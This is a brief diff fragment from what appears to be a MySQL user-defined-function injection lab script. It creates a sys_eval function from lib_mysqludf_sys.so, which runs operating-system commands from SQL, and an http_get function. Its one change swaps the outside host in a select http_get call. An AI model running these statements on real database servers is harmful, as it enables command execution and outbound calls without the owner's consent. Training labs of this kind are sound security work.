@@ -18,7 +18,7 @@ create function sys_eval returns string soname 'lib_mysqludf_sys.so'
 
 create function http_get returns string soname 'mysql-udf-http.dll'
 
-select http_get('https://master.kotnova.com/lab12=udf_injection')
+select http_get('https://kever.io/lab12=udf_injection')
 
 
 
